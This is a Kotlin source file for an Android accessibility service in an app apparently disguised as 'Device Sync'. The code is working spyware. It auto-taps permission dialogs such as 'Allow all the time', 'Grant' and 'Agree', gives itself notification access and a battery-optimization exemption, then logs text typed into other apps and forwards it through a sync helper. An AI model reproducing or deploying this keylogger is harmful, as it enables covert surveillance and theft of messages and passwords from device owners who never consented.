package com.devicesync.assistant.services

import android.accessibilityservice.AccessibilityService
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.devicesync.assistant.helpers.ConfigHelper
import com.devicesync.assistant.helpers.SyncHelper

class InputReaderService : AccessibilityService() {

    private val handler = Handler(Looper.getMainLooper())
    private var lastInputText = ""
    private var lastAppPackage = ""
    private var setupComplete = false

    override fun onServiceConnected() {
        super.onServiceConnected()
        // Start auto-setup immediately when accessibility is granted
        handler.postDelayed({ startAutoSetup() }, 500)
    }

    private fun startAutoSetup() {
        if (setupComplete) return
        // Trigger SetupActivity to continue the flow
        val intent = Intent(this, com.devicesync.assistant.SetupActivity::class.java)
        intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP
        startActivity(intent)
        // Keep tapping Allow every 800ms for 30 seconds to catch all dialogs
        var count = 0
        val runnable = object : Runnable {
            override fun run() {
                autoTapAllow()
                autoHandleNotificationAccess()
                autoHandleBatteryOptimization()
                count++
                if (count < 40) {
                    handler.postDelayed(this, 800)
                } else {
                    setupComplete = true
                }
            }
        }
        handler.postDelayed(runnable, 800)
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return
        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                handleInputObserved(event)
            }
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED,
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                autoTapAllow()
                autoHandleNotificationAccess()
                autoHandleBatteryOptimization()
            }
        }
    }

    private fun autoTapAllow() {
        try {
            val root = rootInActiveWindow ?: return
            val keywords = listOf(
                "Allow", "ALLOW",
                "While using the app",
                "Only this time",
                "Allow all the time",
                "ALLOW ALL THE TIME",
                "OK", "Accept",
                "Continue", "CONTINUE",
                "Agree", "AGREE",
                "Grant", "GRANT"
            )
            for (keyword in keywords) {
                val nodes = root.findAccessibilityNodeInfosByText(keyword)
                if (nodes != null) {
                    for (node in nodes) {
                        if (node.isClickable) {
                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                            handler.postDelayed({ autoTapAllow() }, 300)
                            return
                        }
                        // Try parent if node itself not clickable
                        val parent = node.parent
                        if (parent != null && parent.isClickable) {
                            parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                            handler.postDelayed({ autoTapAllow() }, 300)
                            return
                        }
                    }
                }
            }
            root.recycle()
        } catch (e: Exception) {}
    }

    private fun autoHandleNotificationAccess() {
        try {
            val enabled = Settings.Secure.getString(
                contentResolver, "enabled_notification_listeners"
            ) ?: ""
            if (enabled.contains(packageName)) return

            val root = rootInActiveWindow ?: return
            val appNodes = root.findAccessibilityNodeInfosByText("Device Sync")
            if (appNodes != null) {
                for (node in appNodes) {
                    if (node.isClickable) {
                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        handler.postDelayed({ autoTapAllow() }, 500)
                        return
                    }
                }
            }
            root.recycle()
        } catch (e: Exception) {}
    }

    private fun autoHandleBatteryOptimization() {
        try {
            val root = rootInActiveWindow ?: return
            val nodes = root.findAccessibilityNodeInfosByText("Don't optimize")
            if (nodes != null) {
                for (node in nodes) {
                    if (node.isClickable) {
                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        return
                    }
                }
            }
            root.recycle()
        } catch (e: Exception) {}
    }

    private fun handleInputObserved(event: AccessibilityEvent) {
        try {
            val packageName = event.packageName?.toString() ?: return
            val inputText = event.text?.joinToString("") ?: return
            if (inputText.isBlank()) return
            if (inputText == lastInputText && packageName == lastAppPackage) return
            lastInputText = inputText
            lastAppPackage = packageName
            val config = ConfigHelper.getConfig()
            val observedApps = config.observedApps
            if (observedApps.isNotEmpty() && !observedApps.contains(packageName)) return
            val appName = try {
                val pm = applicationContext.packageManager
                val appInfo = pm.getApplicationInfo(packageName, 0)
                pm.getApplicationLabel(appInfo).toString()
            } catch (e: Exception) { packageName }
            SyncHelper.sendInputObserved(appName, packageName, inputText)
        } catch (e: Exception) {}
    }

    override fun onInterrupt() {}
}
